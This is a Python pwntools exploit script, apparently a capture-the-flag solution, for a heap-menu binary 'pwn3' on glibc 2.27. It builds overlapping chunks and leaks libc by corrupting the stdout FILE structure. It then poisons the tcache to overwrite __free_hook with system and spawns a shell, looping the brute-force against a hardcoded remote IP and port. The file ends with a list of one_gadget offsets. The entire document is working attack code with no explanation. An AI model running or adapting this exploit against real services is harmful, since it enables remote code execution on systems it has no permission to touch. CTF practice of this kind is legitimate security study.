#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda a:p.sendline(a)
sd = lambda a:p.send(a)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda a,b:p.sendlineafter(a,b)
rv = lambda a:p.recv(a)
ru = lambda a:p.recvuntil(a)
ia = lambda :p.interactive()
context.log_level = 'debug'
'''
if(sys.argv[1] == 'l'):
	p = process('./pwn3')
	elf = ELF('./pwn3',checksec=False)
	libc = ELF('./libc.so')

else:
	p = remote('47.93.204.245',26501)
	elf = ELF('./pwn3',checksec=False)
	libc = ELF('./libc-2.27.so')
'''
def menu(cmd):
    sla('>>>',str(cmd))

def add(idx,size,content):
    menu(1)
    ru("idx:")
    sl(str(idx))
    ru("len:")
    sl(str(size))
    ru("content:")
    sd(content)

def delete(idx):
    ru(">>>")
    sl('2')
    ru("idx:")
    sl(str(idx))

def pwn():

    ###chunk overlapping###
    add(0,0x68,'aaa')
    add(1,0x400,'bbb')
    add(2,0x60,'ccc')
    add(3,0x60,'ddd')
    add(4,0xf0,'ddd')

    payload = 'A' * 0x60 + p64(0) + '\xf1'
    delete(0)
    add(0,0x68,payload)


    delete(2)
    delete(1)
    delete(3)

    add(1,0x400,'aaaa')

    ###leak libc###
    payload = '\x60' + '\x57'
    add(2,0x70,payload)
    
    add(5,0x60,'no')
    add(6,0x60,'no')
  
    payload = p64(0xfbad1800) + p64(0) * 3 + p8(0x58)
    add(7,0x60,payload)

    libc_base = u64(ru('\x7f')[-6:].ljust(8,'\x00')) - 0x3e82a0
    success('libc base:'+hex(libc_base))
  
    pause()
    ###tcache dup###
    add(8,0x88,'aaaa')
    add(9,0xf0,'bbbb')
    add(10,0x70,'cccc')
    add(11,0x70,'dddd')
    add(12,0x20,'/bin/sh\x00')

    payload = 'A' * 0x80 + p64(0) + '\x81'
    delete(8)
    add(8,0x88,payload)

    delete(10)
    delete(9)

    free_hook = libc_base + libc.symbols['__free_hook']
    system = libc_base + libc.symbols['system']

    payload = 'A' * 0xf0 + p64(0) + p64(0x80) + p64(free_hook)
    add(13,0x170,payload)

    one_gadget = libc_base + 0x4f2c5
    add(14,0x70,'/bin/sh\x00')
    add(15,0x70,p64(system))

    ###get shell###
    success(hex(system))
    delete(14)
    ia()

while(1):
    #p = process(['./pwn3'],env={"LD_PRELOAD":"./libc-2.27.so"})
    p = remote('47.93.204.245',26501)
    elf = ELF('./pwn3',checksec=False)
    libc = ELF('./libc-2.27.so')
    #libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

    try:
        pwn()
        p.close()
    except:
        p.close()
        pass

'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''